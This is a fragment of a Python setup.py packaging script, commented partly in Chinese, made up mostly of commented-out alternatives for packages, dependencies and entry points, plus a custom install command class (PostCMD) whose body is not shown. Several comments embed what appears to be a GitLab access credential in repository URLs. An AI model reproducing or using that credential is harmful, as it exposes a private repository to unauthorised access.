          packages = find_packages(), 
        #   packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),    
        #   packages=find_packages(include=['Cryptodome','Cryptodome.*','cryptocode','cryptocode.*']),   
        #   packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),  



        #   'somepackage==1.2.0',
        #     'repo==1.0.0',
        #     'anotherpackage==4.2.1'
          # f'SH.py=={Var.nameB}'
                #  'repo @ https://github.com/user/archive/master.zip#egg=repo-1.0.0',
                #  f'SH.py@https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v3.5#egg=SH.py'
          
                #  https://github.com/moon-start/SH/archive/refs/tags/v2.1.zip
        #   install_requires=[
        #        #  'repo @ https://github.com/user/archive/master.zip#egg=repo-1.0.0',
        #          'SH.py @ git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v3.5#egg=SH.py',
        #   ],
          
        #   # 'https://github.com/user/repo/tarball/master#egg=repo-1.0.0'
        #   dependency_links=[
        #         f'https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v{Var.nameB}#egg=SH.py'
        #   ],

          ####################### 宣告目錄 #### 使用 __init__.py
          ## 1 ################################################ 
          # packages=find_packages(include=['cmds','cmds.*']),
          # packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),    
          ## 2 ###############################################
          # packages=['git','git.cmd',"git.mingw64"],
          # packages=['cmds'],
          # packages = ['moonXP'],
          # package_data = {'': ["moon"] },
          #################################
          # package_data = {"/content" : ["/content/cmd.py/cmds/__init__.py"]},
          #################################
          # data_files=[
          #       # ('bitmaps', ['bm/b1.gif', 'bm/b2.gif']),
          #       # ('config', ['cfg/data.cfg']),
          #       ( siteD , ['books/siteR.py'])
          # ],
          #################################
          # data_files=[
          #         # ('bitmaps', ['bm/b1.gif', 'bm/b2.gif']),
          #         # ('config', ['cfg/data.cfg'])
          #         ############ /content/cmd.py
          #         # ('/content', ['cmds/__init__.py'])
          #         ('', ['cmds/__init__.py'])
          # ],
          

          ## 相對路徑 ["cmds/AAA.py"] 壓縮到包裡--解壓縮的依據
          # !find / -iname 'AAA.py'
          # /usr/local/lib/python3.7/dist-packages/content/AAA.py
          # data_files=[
          #         # (f"/{sdist.dir}", ["books/siteR.py"])
          #         (f"{ siteD }", ["books/siteR.py"])
          # ],
          # data_files=[
          #   (r'Scripts', ['bin/pypi.exe']),
          #   (r'Scripts', ['bin/pypi-t.exe'])
          #   # (r'/', ['bin/git.exe'])
          # ],
        #   ## 安裝相關依賴包 ##
        #   install_requires=[
        #       'cmds.py==0.159'

        #   ### 會自動更新最高版本
        #   # !pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==2.8
        #     #   'git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==2.8'



        #   #     # ModuleNotFoundError: No module named 'apscheduler'
        #   #     'apscheduler'
              
        #   #     # 'argparse',
        #   #     # 'setuptools==38.2.4',
        #   #     # 'docutils >= 0.3',
        #   #     # 'Django >= 1.11, != 1.11.1, <= 2',
        #   #     # 'requests[security, socks] >= 2.18.4',
        #   ],
        #   ################################
        #   ## python 入口點
        #   entry_points={
        #         ## Python中, 使用setup.py和console_scripts參數創建安裝包和shell命令
        #         'console_scripts':[                                                        
        #             'databases=md.databases:main',                      
        #         ],
        #   },
        #   ################################
        #   ## python 入口點
        #   entry_points={
        #         ## Python中, 使用setup.py和console_scripts參數創建安裝包和shell命令
        #         'console_scripts':[                                                        
        #             'databases=md.databases:main',                      
        #         ],
        #   },


        #   ## python 入口點
        #   entry_points={
          
        #         'console_scripts':[                                                        
        #             'cmdsSQL=SQL.databasesB:main',  
        #             'cmdsMD=md.databases:main',                      
        #         ],
        #   },

          ################################
          cmdclass={
                'install': PostCMD
                # 'develop':  PostCMD
          },
          #########################
          ## https://setuptools.pypa.io/en/latest/userguide/datafiles.html
          include_package_data=True, # 將數據文件也打包
          zip_safe=True
    )
   

### B



